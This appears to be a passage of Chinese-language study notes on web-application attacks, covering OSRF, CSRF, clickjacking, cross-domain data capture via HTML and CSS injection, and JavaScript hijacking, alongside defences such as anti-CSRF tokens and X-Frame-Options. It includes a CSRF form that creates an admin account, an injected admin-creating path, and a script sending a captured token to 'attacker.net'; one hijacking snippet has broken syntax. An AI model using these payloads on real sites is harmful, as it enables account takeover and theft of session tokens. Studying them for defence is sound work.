<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--请求参数--&gt;</span><br>type=question&amp;name=daf&amp;message=foo<br><br><span class="hljs-comment">&lt;!--页面结构--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/images/question.gif&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>daf<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--开发者可能对 name 和 message 参数进行了过滤，但攻击可以针对 img 标签的 src 标签属性设计插入</span><br><span class="hljs-comment">&quot;/admin/newUser.php?username=daf2&amp;password=0wned&amp;role=admin#&quot;，最后的 # 符号将终止原本的 .gif 后缀--&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>案例1：eBay 网站</p>
<ul>
<li>攻击者创建一个拍卖品，吸引用户去点击查看它；攻击者在创建卖品时，会上传一个指向站外服务器的卖品图片链接；创建时，该链接是有效的，指向的内容确实是一张图片，从而可以通过 eBay 的检查机制；</li>
<li>卖品创建完成后，攻击品替换了链接中的内容，变成了一段脚本；</li>
<li>当受害者点击该链接时，会将恶意脚本下载到本地并执行；</li>
<li>该恶意脚本会代表受害者发起一个链接，对 eBay 上面另外一个卖品发起任意的报价；</li>
</ul>
<p>渗透测试步骤</p>
<ul>
<li>如果一个用户输入的数据，会显示在另外一名用户的界面上，则它除了可能存在保存型 XSS 漏洞外，还有可能存在 OSRF 型漏洞；</li>
<li>用户提交的数据被插入到某个 URL 或者路径中的时候，很有可能存在 OSRF 漏洞（除非应用程序设置字符白名单进行过滤）</li>
<li>如果发现 OSRF 漏洞， 则应该有针对性的设计 URL 请求作为攻击目标；</li>
</ul>
<h4 id="跨站点请求伪造"><a href="#跨站点请求伪造" class="headerlink" title="跨站点请求伪造"></a>跨站点请求伪造</h4><blockquote>
<p>CSRF: cross site request forgery</p>
</blockquote>
<h5 id="攻击原理和示例"><a href="#攻击原理和示例" class="headerlink" title="攻击原理和示例"></a>攻击原理和示例</h5><p>攻击者通过创建一个看似无害的网站，然后放置一个指向目标网站的链接，诱使用户点击该链接，向目标网站发起请求，执行攻击者想要实现的恶意操作；</p>
<blockquote>
<p>同源策略并不会阻止 A 网站向 B 网站发起请求，但是它会阻止 A 网站的脚本处理 B 网站的响应；因此，CSRF 是一种单向的攻击；</p>
</blockquote>
<p>假设某个网站允许管理员用户发起一个请求来创建一名新用户，创建其设置的请求格式如下：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/auto/390/NewUserStep2.ashx</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>mdsec.net<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>SessionId=12346<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urleencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>83<br><br><span class="language-dts"><span class="hljs-attr">realname</span><span class="hljs-operator">=</span>daf<span class="hljs-variable">&amp;username</span>=daf<span class="hljs-variable">&amp;userrole</span>=admin<span class="hljs-variable">&amp;password</span>=letmein1<span class="hljs-variable">&amp;confirmpassword</span>=letmein1</span><br></code></pre></td></tr></table></figure>

<p>该请求由于以下三个方面的原因，导致其容易受到 CSRF 攻击</p>
<ul>
<li>该请求可以执行特权操作；</li>
<li>该请求仅依靠 cookie 来追踪会话，没有其他令牌或者无法预测的值；</li>
<li>除 cookie 外，请求中的所有其他参数值都是可以预测的；</li>
</ul>
<p>攻击者可以通过构建如下表单，诱使用户点击提交请求，达到攻击目的</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https//mdsec.net/auth/390/NewUserStep2.ashx&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;realname&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;daf&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;usernmae&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;daf&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;userrole&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;admin&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;letmein1&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;confirmpassword&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;letmein1&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-number">0</span>].<span class="hljs-title function_">submit</span>();</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>浏览器在发起跨域请求时，会自动带上目标网站的 cookie，导致攻击得以实现；</p>
</blockquote>
<h5 id="利用-CSRF-漏洞"><a href="#利用-CSRF-漏洞" class="headerlink" title="利用 CSRF 漏洞"></a>利用 CSRF 漏洞</h5><p>CSRF 漏洞常常出现在应用程序仅依赖 cookie 进行会话管理的场景；</p>
<p>渗透测试步骤</p>
<ul>
<li>解析应用程序的功能；</li>
<li>找到某项仅依赖 cookie 来追踪用户会话的敏感功能，确认功能的请求参数可以提前确认，不包含无法预测的数据；</li>
<li>创建一个无需交互操作即可发起请求的 HTML 页面（GET 请求可使用 img 标签；POST 请求则使用隐藏表单）；</li>
<li>登录应用程序后，使用同一个浏览器加载该 HTML 页面，确认应用程序的反应，看它是否执行所需要的操作；</li>
</ul>
<blockquote>
<p>假设应用程序的某个管理功能，接受某个用户标识符的参数（如用户id），然后会查询数据库，返回与该用户相关的信息，并显示在界面上；由于该功能仅管理员可用，而管理员本来就具有查看权限，因此开发者通常情况下不会对该功能做 CSRF 防御；</p>
<p>假设该功能的某个参数中，存在 SQL 注入漏洞，那么攻击者就会很有兴趣诱使非管理员用户去点击某个 CSRF 链接，发起请求，利用 SQL 注入漏洞，实现想要的查询；</p>
</blockquote>
<h5 id="CSRF-与登录"><a href="#CSRF-与登录" class="headerlink" title="CSRF 与登录"></a>CSRF 与登录</h5><p>案例2：家庭路由器</p>
<p>路由器通常有一个管理界面，上面有一些敏感操作，例如开放端口供外部访问；很多用户在购买路由器后，并不会修改上面的默认密码，而有不少设备厂家对设备使用通用密码，这使得攻击者可以提前知道默认密码是什么；如果用户之前登录过该路由器，攻击者可以设计一个看似无害的恶意 URL，诱使用户点击，之后向本地的路由器发起一个请求；该请求将携带之前用户登录时获得的令牌，从而路由器将接受攻击者的请求和参数，并进行处理；</p>
<p>案例3：文件上传与下载</p>
<p>某个应用程序提供文件上传和下载功能，由于文件是私有的，只能由上传者本人下载，因此开发者可能误以为该功能没有攻击的价值，从而没有设置足够的防御措施；攻击者可以设计第一个 URL，诱使用户点击，然后以攻击者提前注册好的账号密码登录目标网站；攻击者再设计第二个 URL，诱使用户点击，此时用户将以攻击者的身份，从而该网站上下载攻击者放置的恶意脚本文件，并执行它，实现攻击者的目标意图；(诱使受害者以攻击者的身份，下载攻击者上传的恶意文件)</p>
<h5 id="防止-CSRF-漏洞"><a href="#防止-CSRF-漏洞" class="headerlink" title="防止 CSRF 漏洞"></a>防止 CSRF 漏洞</h5><p>防止 CSRF 漏洞的一个办法是避免仅依赖 cookie 来追踪用户的会话，而应该增加一个隐藏表单字段，存放一个无法预测的随机值；当用户发起请求时，需要一起发送该字段值；服务器结合 cookie 和该字段值来确认用户的身份；</p>
<blockquote>
<p>某些应用程序将反 CSRF 令牌设置得过短，因为猜想攻击者如果使用蛮力攻击，短时间内提交过多无效令牌请求，那么请求程序将终止攻击者的会话，从而终止攻击。</p>
<p>以上思路虽然没错，但攻击者可以避开该方法，枚举所有可能的令牌值，然后分散放到不同用户的页面上，当某个链接被点击后，监控其服务端的响应，如果响应正常，则说明该令牌有效；之后攻击者就可以使用该令牌伪造用户身份发起请求；</p>
</blockquote>
<p>由于 CSRF 是单向攻击，有些开发者使用多阶段操作，来规避漏洞，其思路是即使攻击者伪造了第一阶段的请求，由于用户会收到响应，并在第二阶段确认操作是否无误，这时候就会发现异常，那么理论上就可以避免攻击者在第一阶段发起的操作直接生效；实际上攻击者经常直接第二个请求，完全不管第一个；或者当用户点击恶意链接后，攻击者按先后顺序同时发出两个请求即可；</p>
<h5 id="通过-XSS-突破-CSRF-防御"><a href="#通过-XSS-突破-CSRF-防御" class="headerlink" title="通过 XSS 突破 CSRF 防御"></a>通过 XSS 突破 CSRF 防御</h5><p>如果某个应用程序存在 XSS 漏洞，那么极大概率 CSRF 的防御机制将失效，因为攻击者通过 XSS 漏洞可以读取到任何需要的令牌值；</p>
<blockquote>
<p>除了反射型 XSS 漏洞外，因为利用该漏洞，首先需要发起一个请求，之后才能在响应中插入恶意代码；但如果此时有 CSRF 防御，那么意味着需要一个令牌才能让请求成功，于是这就变成了一个先有鸡还是先有蛋的问题；</p>
</blockquote>
<ul>
<li>如果应用程序存在任何保存型的 XSS 漏洞，那么攻击者可以利用这些漏洞直接突破 XSRF 防御；</li>
<li>由于 CSRF 防御令牌通常在整个会话期间都是一致的，这意味着如果有任何一个页面存在反射型 XSS 漏洞，同时缺少 CSRF 防御，那么攻击者就可以利用该漏洞取得令牌，让 CSRF 防御失效；</li>
<li>如果令牌与用户账号关联，而不是与会话关联，那么攻击者可以伪造表单，让受害者以自己的账号登录应用程序，下载恶意代码；然后假装意外退出账号，诱使受害者使用其自己的账号登录；由于恶意代码已经在本地运行，受害者在登录过程中和登录后都将受到攻击者的控制；</li>
<li>如果令牌与会话关联，但同时应用程序的 cookie 存在注入漏洞，那么攻击者将直接用自己的 cookie 和令牌替换受害者的 cookie 和令牌，下载恶意代码，之后的操作与上一步相同；</li>
</ul>
<blockquote>
<p>CSRF 防御可以在一定程度上保护 XSS 漏洞，但作用只有一点点，安全的做法还是应该修复所有的 XSS 漏洞；</p>
</blockquote>
<h3 id="UI-伪装"><a href="#UI-伪装" class="headerlink" title="UI 伪装"></a>UI 伪装</h3><p>UI 伪装的原理很简单，即攻击者的页面会使用 iframe 元素，将目标页面的内容加载到其中，这样该页面看起来像真的一样，以便能够诱使用户进行点击；但实际上，攻击者在该 iframe 元素上覆盖了一层透明层，用户看不见；当用户进行操作时，会误以为是在与目标程序进行交互，但实际是与攻击者设计的透明元素进行交互；虽然由于同源策略，攻击者无法读取令牌，但是透明元素向目标程序发起的请求，将自动携带有令牌，从而导致攻击者可以诱使用户做出一些该用户并不知情的操作；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210314090708.png" srcset="/img/loading.gif" lazyload></p>
<p>攻击者还可以在其页面中设计各种诱使用户的操作，当用户进行操作时，攻击者使用脚本代码将这些操作传递到目标程序的页面，从而以用户的名义，向目标程序页面发送这些操作，并在用户不知情的情况下，最终向目标程序发起这些操作；</p>
<h4 id="破坏-iframe-防御"><a href="#破坏-iframe-防御" class="headerlink" title="破坏 iframe 防御"></a>破坏 iframe 防御</h4><p>为了防止 UI 伪装攻击，开发者在自己的页面加载后，会运行一段代码，检查自己的页面是否被浏览器加载到了一个 iframe 中，如果是的话，就终止服务，重定向的报错页面；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 检测并逃离 iframe 示例--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br>	if (top.location != self.location) &#123;<br>        top.location = self.location;<br>    &#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>攻击者有多种方法可以避开上面这种简单的防御办法，包括如下：</p>
<ul>
<li>虽然攻击者的页面在顶层，控制着整个页面，因为攻击者可以有改变页面上一个变量的含义；当子 iframe 页面中的代码尝试访问这些变量时，会得不到预期的结果，例如: var location = 'foo'；</li>
<li>攻击者可以监听页面的 window.onBeforeUnload 事件，当页面加载后，就对目标程序的防御代码进行搜索和禁用；例如定义 sandbox 属性，从而禁用 iframe 页面中的脚本，同时保持 cookie 有效；</li>
</ul>
<h4 id="防止-UI-伪装"><a href="#防止-UI-伪装" class="headerlink" title="防止 UI 伪装"></a>防止 UI 伪装</h4><p>通过使用 X-Frame-Options 消息头，可以指示浏览器不将当前页面加载到 irame 中，从而实现对 UI 伪装的防御；该属性支持两个值，其意义分别如下：</p>
<ul>
<li>deny：拒绝所将页面插入 iframe 的尝试；</li>
<li>sameorigin：仅当前域名可插入，任何第三方域名都不用插入；</li>
</ul>
<blockquote>
<p>在测试是否存在 UI 伪装漏洞时，要同时检查一下移动设备的版本；因为移动设备上的表现经常跟 PC 端有所不同；</p>
</blockquote>
<h2 id="跨域捕获数据"><a href="#跨域捕获数据" class="headerlink" title="跨域捕获数据"></a>跨域捕获数据</h2><p>虽然同源策略可以限制 A 域的代码访问 B 域数据；但是仍然存在一些办法，可以实现这种访问；</p>
<h3 id="通过注入-HTML-捕获数据"><a href="#通过注入-HTML-捕获数据" class="headerlink" title="通过注入 HTML 捕获数据"></a>通过注入 HTML 捕获数据</h3><p>攻击者可以利用应用程序提供的功能，在其他用户收到的响应中注入一段有限的 HTML；在这种情况下，就可以利用 HTML 注入条件，向攻击者所在的域发送页面中的敏感数据（因为此时是在受害者打开的页面中，受害者发起的请求，是在应用程序的域中，因此不受到同源策略的影响）；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--假设应用程序通过设置隐藏表单进行 CSRF 防御，那么页面上一般会有如下的隐藏表单，用来发送令牌--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://app.com/forward_email&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;nonce&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;2230313740821&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Forward&quot;</span>&gt;</span><br>    ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">	<span class="hljs-keyword">var</span> _StatsTRackerId=<span class="hljs-string">&#x27;AAE78RF27CB3210D&#x27;</span>;</span><br><span class="language-javascript">    ...</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>攻击者可以在该隐藏表单之前，找到一个插入点，注入以下文本：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210315081459.png" srcset="/img/loading.gif" lazyload></p>
<p>由于该文本也是一段 HTML 标签，但没有结束，那么在注入后，浏览器将在等号之后的文本中，寻找下一个单引号，以便进行配对；从而使得攻击者有机会将等号之后的内容，下一个单引号之前的内容，纳为其可注入的链接的参数的一部分；</p>
<p>当受害者点击该图片链接时向攻击的域发起请求时，受害者页面上的隐藏表单内容，将作为请求参数的组成部分，发送给攻击者的域，从而使得攻击者捕获了隐藏表单中的令牌；</p>
<p>另外一种攻击方法是在隐藏表单之前，注入以下的文本：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210315081927.png" srcset="/img/loading.gif" lazyload></p>
<p>由于该段文本是一段 HTML 标签的前半部分，但不包含结束标签；那么浏览器会一直往后寻找，直到找到配对的标签为止；那么原页面上的 form 起始标签将被忽略（相当于注释掉了），但表单中的内容仍然有效。此时隐藏表单相当于被修改了，原本表单是要向应用程序的域发起的请求，现在变成了向攻击者的域发起请求；</p>
<blockquote>
<p>第二种攻击方法注入的是合法且有效的 HTML 子集，因此很可能会避开潜在的输入确认机制；</p>
</blockquote>
<h3 id="通过注入-CSS-捕获数据"><a href="#通过注入-CSS-捕获数据" class="headerlink" title="通过注入 CSS 捕获数据"></a>通过注入 CSS 捕获数据</h3><p>注入 HTML 的缺点在于注入内容中需要使用尖括号，因此会被常见的过滤机制删除或者进行 HTML 编码，从而使得注入失效；因此，攻击者会转而采用注入 CSS 内容，来达到攻击目的；</p>
<p>攻击者在邮件的主题行中，设置如下内容的标题</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210315085442.png" srcset="/img/loading.gif" lazyload></p>
<p>该内容在邮件中注入后变成如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Wao Inbox<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        ...<br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>&#123;&#125; *&#123;font-family: &#x27;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        ...<br>        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://app.com/forward_email&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;nonce&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;2230313740821&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Forward&quot;</span>&gt;</span><br>            ...<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">            <span class="hljs-keyword">var</span> _StatsTRackerId=<span class="hljs-string">&#x27;AAE78RF27CB3210D&#x27;</span>;</span><br><span class="language-javascript">            ...</span><br><span class="language-javascript">        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>由于注入的内容为 CSS，并且单引号未结束，浏览器将继续往下寻找单引号进行配对（直到 script 的变量定义部分找到）；两个单引号之间的内容变成了 font-family 的属性值；</p>
<blockquote>
<p>理论上 CSS 的属性值可以不需要使用单引号括起来，但为了避免在敏感数据之前出现分号，导致 CSS 属性值的长度被提前终止，未包含敏感数据，故在此处使用单引号，以便其和 script 中的引号进行配对，确认两个引号之间的内容包含了敏感数据；</p>
</blockquote>
<p>在完成了以上注入动作后，敏感数据已经包含在 font-family 属性；接下来攻击者再在邮件内容中插入一段脚本（此段内容属于攻击者的域），去读取 font-family 属性值，放在某个图片的 src 属性中；当用户点击该图片时，将触发图片上的 src 请求，发送敏感数据到攻击者的服务器；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://wao-mail.com/inbox&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">	<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;img src=&quot;http://attacker.net/capture?&#x27;</span> + </span><br><span class="language-javascript">                   <span class="hljs-built_in">escape</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">currentStyle</span>.<span class="hljs-property">fontFamily</span>) + <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h3 id="Javascript-劫持"><a href="#Javascript-劫持" class="headerlink" title="Javascript 劫持"></a>Javascript 劫持</h3><p>背景：虽然同源策略阻止 A 域的脚本读取 B 域的响应敏据，但是并没有限制 A 域可以包含来自 B  域的脚本代码，同时这些脚本代码允许在 A 域中执行；一种常见的使用场景是 A 引用 B 的静态脚本，例如 JQuery；</p>
<p>由于静态脚本代码本来是公开的，其中并不包含敏感数据，所以一般这种做法并不会带来危险；但是今天很多应用程序使用脚本代码来传输敏感数据，有些应用程序甚至还允许动态插入脚本，因此，攻击者从中可以找到一些漏洞机会；</p>
<h4 id="函数回调"><a href="#函数回调" class="headerlink" title="函数回调"></a>函数回调</h4><p>假设某个应用程序在页面上引用某个脚本文件，来处理某个用户点击事件；当点击事件发生时，会执行该脚本文件中的代码，向服务端发起用户信息请求，并在收到响应后，调用脚本中的 showUserInfo 回调函数来处理响应中的用户敏感数据；</p>
<p>针对以上情形，攻击者可以设计一个网页，在其中隐蔽放上一个诱使用户进行点击的链接，同时引用目标程序的脚本，但自定义一个自己的 showUserInfo 函数；当点击发生时，引用的脚本会向目标程序请求用户数据；如果在点击之前，用户恰好已对登录过目标程序，则该请求将是有效的；得到响应后，由于回调函数已经被攻击者定义的函数覆盖，响应将由攻击者定义的脚本进行处理，从而捕获用户的敏感数据；</p>
<blockquote>
<p>有个困惑：攻击者引用目标程序脚本并覆盖回调函数，该脚本向目标网站 B 域发起请求，那么返回的响应是否能够被攻击者设计的网页 A 域进行处理？</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">	<span class="hljs-keyword">function</span> <span class="hljs-title function_">showUserInfo</span> (<span class="hljs-params">x</span>) &#123; <span class="hljs-title function_">alert</span>(x); &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://target_app.net/source.ashx&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h4 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h4><p>应用程序经常使用 JSON 作为数据的传输格式，JSON 本质上是一堆字符串，因此浏览器在接收到该字符串后，需要对其进行解析；攻击者可以在自定义页面中，对 Javascript 内置数据类型的构造函数进行修改，从而改变解析 JSON 的结果</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--攻击者在自定义页面中重置 Array 构造函数--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">	<span class="hljs-keyword">function</span> <span class="hljs-title function_">capture</span>(<span class="hljs-params">s</span>) &#123; <span class="hljs-title function_">alert</span>(s); &#125;</span><br><span class="language-javascript">    <span class="hljs-keyword">function</span> <span class="hljs-title function_">Array</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">this</span>[i] setter = capture;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://target_app.net/source.ashx&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><p>为了提高用户体验，很多开发者会使用 AJAX 向服务端请求数据，并在前端使用脚本处理响应，更新局部网页；假设应用程序在响应中的某个变量放置了临时令牌，用来反 CSRF；那么攻击者可以自定义网页中先引用应用程序的公开脚本，然后再定义自己的脚本去读取该变量，捕获敏感数据；</p>
